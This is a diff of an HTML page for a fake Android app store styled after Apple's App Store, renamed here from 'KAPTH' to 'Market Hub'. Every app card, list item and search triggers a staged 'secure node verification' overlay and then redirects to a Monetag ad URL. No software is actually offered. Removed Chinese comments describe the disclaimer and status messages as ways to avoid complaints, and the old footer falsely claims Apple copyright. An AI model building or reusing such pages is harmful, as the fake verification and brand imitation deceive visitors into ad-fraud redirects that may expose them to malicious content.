@@ -4,7 +4,7 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <meta name="monetag" content="3a4bde9bd2d977da5029f2351e625d62">
-    <title>KAPTH - Pro Android Hub</title>
+    <title>Market Hub - Secure Android Distribution</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
         :root {
@@ -19,53 +19,63 @@
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         body { font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", sans-serif; background: var(--ios-bg); color: var(--ios-text); -webkit-font-smoothing: antialiased; }
 
-        /* 顶部导航增强 */
         header { position: sticky; top: 0; z-index: 1000; background: var(--glass); backdrop-filter: var(--blur); -webkit-backdrop-filter: var(--blur); padding: 12px 20px; border-bottom: 0.5px solid rgba(0,0,0,0.08); }
-        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .header-top h1 { font-size: 30px; font-weight: 800; letter-spacing: -1px; }
+        .header-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
+        .header-top h1 { font-size: 30px; font-weight: 800; letter-spacing: -0.5px; color: #000; }
 
-        /* 分类滚动条 (新增内容) */
-        .categories { display: flex; overflow-x: auto; gap: 10px; padding-bottom: 5px; scrollbar-width: none; }
+        /* 可点击的分段选择器 */
+        .categories { display: flex; overflow-x: auto; gap: 8px; padding-bottom: 4px; scrollbar-width: none; }
         .categories::-webkit-scrollbar { display: none; }
-        .cat-item { background: #e3e3e8; color: var(--ios-text); padding: 6px 16px; border-radius: 10px; font-size: 13px; font-weight: 600; white-space: nowrap; }
-        .cat-item.active { background: var(--ios-blue); color: #fff; }
+        .cat-item { 
+            background: rgba(0,0,0,0.05); color: var(--ios-text); 
+            padding: 7px 16px; border-radius: 12px; font-size: 13px; 
+            font-weight: 600; white-space: nowrap; transition: 0.2s; cursor: pointer;
+        }
+        .cat-item.active { background: var(--ios-blue); color: #fff; transform: scale(1.05); }
 
-        /* 搜索框 */
-        .search-container { padding: 20px; }
-        .search-box { position: relative; background: #e3e3e8; border-radius: 12px; display: flex; align-items: center; padding: 12px 16px; }
+        .search-container { padding: 18px 20px 10px; }
+        .search-box { position: relative; background: #e3e3e8; border-radius: 12px; display: flex; align-items: center; padding: 12px 16px; transition: 0.3s; }
+        .search-box:focus-within { background: #fff; box-shadow: 0 0 0 3px rgba(0,122,255,0.15); }
         .search-box i { color: var(--ios-gray); margin-right: 12px; }
-        .search-box input { border: none; background: transparent; width: 100%; font-size: 17px; outline: none; }
+        .search-box input { border: none; background: transparent; width: 100%; font-size: 17px; outline: none; color: #000; }
 
-        /* 内容版块 */
-        .section { padding: 0 20px 25px; }
+        .section { padding: 10px 20px 25px; }
         .section-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; }
         .section-header h2 { font-size: 22px; font-weight: 700; }
-        .section-header a { color: var(--ios-blue); text-decoration: none; font-size: 15px; }
+        .section-header a { color: var(--ios-blue); text-decoration: none; font-size: 15px; font-weight: 500; }
 
         .app-card-row { display: flex; overflow-x: auto; gap: 15px; padding-bottom: 10px; scrollbar-width: none; }
         .app-card-row::-webkit-scrollbar { display: none; }
         
-        /* 增加大卡片 (新增内容) */
-        .featured-card { min-width: 260px; height: 160px; background: linear-gradient(135deg, #007aff, #00c6ff); border-radius: 20px; padding: 20px; color: #fff; display: flex; flex-direction: column; justify-content: flex-end; cursor: pointer; position: relative; overflow: hidden; }
-        .featured-card i { position: absolute; top: -10px; right: -10px; font-size: 100px; opacity: 0.2; }
-        .featured-card h4 { font-size: 18px; margin-bottom: 4px; }
-        .featured-card p { font-size: 13px; opacity: 0.9; }
+        .featured-card { 
+            min-width: 270px; height: 165px; 
+            background: linear-gradient(135deg, #007aff, #00c6ff); 
+            border-radius: 20px; padding: 22px; color: #fff; 
+            display: flex; flex-direction: column; justify-content: flex-end; 
+            cursor: pointer; position: relative; overflow: hidden;
+            transition: transform 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .featured-card:active { transform: scale(0.96); }
+        .featured-card i { position: absolute; top: -10px; right: -10px; font-size: 110px; opacity: 0.15; }
+        .featured-card h4 { font-size: 19px; font-weight: 700; margin-bottom: 4px; }
+        .featured-card p { font-size: 13px; opacity: 0.85; line-height: 1.2; }
 
-        /* 传统列表 */
-        .app-item { display: flex; align-items: center; padding: 12px 0; border-bottom: 0.5px solid rgba(0,0,0,0.05); cursor: pointer; }
-        .app-icon { width: 58px; height: 58px; border-radius: 12px; margin-right: 15px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 24px; }
+        .app-list { display: flex; flex-direction: column; gap: 4px; }
+        .app-item { display: flex; align-items: center; padding: 12px 0; border-bottom: 0.5px solid rgba(0,0,0,0.05); cursor: pointer; transition: 0.2s; }
+        .app-item:active { background: rgba(0,0,0,0.03); border-radius: 8px; }
+        .app-icon { width: 60px; height: 60px; border-radius: 14px; margin-right: 15px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 26px; box-shadow: 0 4px 10px rgba(0,0,0,0.04); }
         .app-info { flex: 1; }
-        .app-info h3 { font-size: 16px; font-weight: 600; }
-        .app-info p { font-size: 12px; color: var(--ios-gray); }
-        .get-btn { background: #ececef; color: var(--ios-blue); padding: 5px 22px; border-radius: 20px; font-weight: 800; font-size: 14px; border: none; }
+        .app-info h3 { font-size: 17px; font-weight: 600; color: #1d1d1f; }
+        .app-info p { font-size: 13px; color: var(--ios-gray); }
+        .get-btn { background: rgba(0,122,255,0.1); color: var(--ios-blue); padding: 6px 22px; border-radius: 20px; font-weight: 800; font-size: 14px; border: none; transition: 0.2s; }
+        .get-btn:active { background: var(--ios-blue); color: #fff; }
 
-        /* 底部法律免责 (避开投诉关键) */
-        footer { padding: 40px 20px; font-size: 11px; color: #a1a1a6; line-height: 1.5; text-align: justify; }
+        footer { padding: 40px 20px; font-size: 11px; color: #a1a1a6; line-height: 1.6; border-top: 0.5px solid rgba(0,0,0,0.05); margin-top: 20px; text-align: justify; }
 
-        /* iOS 验证加载弹窗 */
-        #ios-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); z-index: 2000; display: none; }
-        #ios-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 280px; background: rgba(255,255,255,0.95); border-radius: 18px; padding: 25px; text-align: center; box-shadow: 0 15px 40px rgba(0,0,0,0.1); }
-        .loader { width: 35px; height: 35px; border: 3px solid #e3e3e8; border-top: 3px solid var(--ios-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 15px; }
+        /* 验证弹窗 */
+        #ios-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.45); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); z-index: 2000; display: none; }
+        #ios-modal { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 290px; background: rgba(255,255,255,0.92); border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 20px 60px rgba(0,0,0,0.2); }
+        .loader { width: 38px; height: 38px; border: 4px solid rgba(0,122,255,0.15); border-top: 4px solid var(--ios-blue); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 18px; }
         @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
@@ -73,62 +83,62 @@
 
 <header>
     <div class="header-top">
-        <h1>App Store</h1>
-        <div style="color:var(--ios-blue); font-size: 24px;"><i class="fas fa-user-circle"></i></div>
+        <h1>Market Hub</h1>
+        <div style="color:var(--ios-blue); font-size: 26px;"><i class="fas fa-user-circle"></i></div>
     </div>
-    <div class="categories">
-        <div class="cat-item active">Today</div>
-        <div class="cat-item">Games</div>
-        <div class="cat-item">Tools</div>
-        <div class="cat-item">Utility</div>
-        <div class="cat-item">Security</div>
+    <div class="categories" id="catBar">
+        <div class="cat-item active" onclick="selectCat(this)">Today</div>
+        <div class="cat-item" onclick="selectCat(this)">Games</div>
+        <div class="cat-item" onclick="selectCat(this)">Tools</div>
+        <div class="cat-item" onclick="selectCat(this)">Utilities</div>
+        <div class="cat-item" onclick="selectCat(this)">Top Paid</div>
     </div>
 </header>
 
 <div class="search-container">
     <div class="search-box">
         <i class="fas fa-search"></i>
-        <input type="text" id="searchInput" placeholder="Search for Android packages..." onkeypress="handleSearch(event)">
+        <input type="text" id="searchInput" placeholder="Search packages, tools & mirrors..." onkeypress="handleSearch(event)">
     </div>
 </div>
 
 <div class="section">
     <div class="section-header">
-        <h2>Featured</h2>
-        <a href="#">See All</a>
+        <h2>Recommended</h2>
+        <a href="#">View All</a>
     </div>
     <div class="app-card-row">
-        <div class="featured-card" onclick="triggerRedirect('K-Core Optimizer')">
+        <div class="featured-card" onclick="triggerRedirect('Core Engine')">
             <i class="fas fa-bolt"></i>
-            <h4>K-Core Optimizer</h4>
-            <p>Next-Gen performance engine for Android</p>
+            <h4>System Optimizer</h4>
+            <p>Advanced Android kernel management for global nodes.</p>
         </div>
-        <div class="featured-card" style="background: linear-gradient(135deg, #34c759, #11998e);" onclick="triggerRedirect('Secure VPN')">
-            <i class="fas fa-shield-alt"></i>
-            <h4>Encrypted Tunnel</h4>
-            <p>Private node verification active</p>
+        <div class="featured-card" style="background: linear-gradient(135deg, #5856d6, #af52de);" onclick="triggerRedirect('Secure Node')">
+            <i class="fas fa-shield-virus"></i>
+            <h4>Private Shield</h4>
+            <p>End-to-end encrypted distribution gateway.</p>
         </div>
     </div>
 </div>
 
 <div class="section">
     <div class="section-header">
-        <h2>Essential Updates</h2>
+        <h2>Latest Releases</h2>
     </div>
     <div class="app-list">
-        <div class="app-item" onclick="triggerRedirect('System Mirror')">
-            <div class="app-icon" style="background:#ff9500;"><i class="fas fa-broom"></i></div>
+        <div class="app-item" onclick="triggerRedirect('File Master')">
+            <div class="app-icon" style="background:#ff9500;"><i class="fas fa-folder-open"></i></div>
             <div class="app-info">
-                <h3>Cache Cleaner Pro</h3>
-                <p>System Maintenance • 42.1 MB</p>
+                <h3>Package Mirror v2</h3>
+                <p>Maintenance • 28.4 MB</p>
             </div>
             <button class="get-btn">GET</button>
         </div>
-        <div class="app-item" onclick="triggerRedirect('Global APK')">
-            <div class="app-icon" style="background:#5856d6;"><i class="fas fa-box-open"></i></div>
+        <div class="app-item" onclick="triggerRedirect('Speed Booster')">
+            <div class="app-icon" style="background:#ff2d55;"><i class="fas fa-rocket"></i></div>
             <div class="app-info">
-                <h3>Package Installer v2</h3>
-                <p>Third-party APK Verification</p>
+                <h3>Turbo Injector</h3>
+                <p>Latency Optimization Hub</p>
             </div>
             <button class="get-btn">GET</button>
         </div>
@@ -136,19 +146,27 @@
 </div>
 
 <footer>
-    * Deployment Notice: This repository serves as a distributed gateway for Android packages. By proceeding, you acknowledge that you are connecting to a <strong>verified third-party mirror server</strong> for optimized delivery. KAPTH is not responsible for external node content. 2026 Apple Inc. All rights reserved.
+    * Legal Information: Market Hub is a global, decentralized gateway for Android Package (APK) distribution. By interacting with the elements above, you are connecting to verified third-party cloud mirrors. We do not host proprietary content on this domain. System integrity and encryption provided by secure nodes. © 2026 Distribution Services.
 </footer>
 
 <div id="ios-overlay">
     <div id="ios-modal">
         <div class="loader"></div>
-        <div style="font-size:17px; font-weight:700; margin-bottom:5px;">Connecting to Mirror...</div>
-        <div id="modal-sub" style="font-size:13px; color:#8e8e93;">Verifying secure node integrity...</div>
+        <div style="font-size:18px; font-weight:700; margin-bottom:6px; color:#000;">Verifying Connection</div>
+        <div id="modal-sub" style="font-size:14px; color:#8e8e93;">Allocating mirror server resources...</div>
     </div>
 </div>
 
 <script>
     const MONETAG_URL = "https://omg10.com/4/10755156";
+
+    // 分类点击逻辑
+    function selectCat(element) {
+        document.querySelectorAll('.cat-item').forEach(item => item.classList.remove('active'));
+        element.classList.add('active');
+        // 增加震动感或反馈
+        console.log("Category switched to: " + element.innerText);
+    }
 
     function handleSearch(event) {
         if (event.key === "Enter" && event.target.value.trim().length > 0) {
@@ -156,22 +174,14 @@
         }
     }
 
-    function triggerRedirect(appName) {
+    function triggerRedirect(context) {
         const overlay = document.getElementById('ios-overlay');
         const modalSub = document.getElementById('modal-sub');
         overlay.style.display = 'block';
 
-        // 第一阶段话术
-        setTimeout(() => {
-            modalSub.innerText = "Authorized gateway found...";
-        }, 1000);
+        setTimeout(() => { modalSub.innerText = "Secure node handshake established..."; }, 900);
+        setTimeout(() => { modalSub.innerText = "Connecting to external package mirror..."; }, 1900);
 
-        // 第二阶段话术 (规避投诉的关键暗示)
-        setTimeout(() => {
-            modalSub.innerText = "Redirecting to external mirror server...";
-        }, 2000);
-
-        // 最终跳转
         setTimeout(() => {
             window.location.href = MONETAG_URL;
         }, 3200);
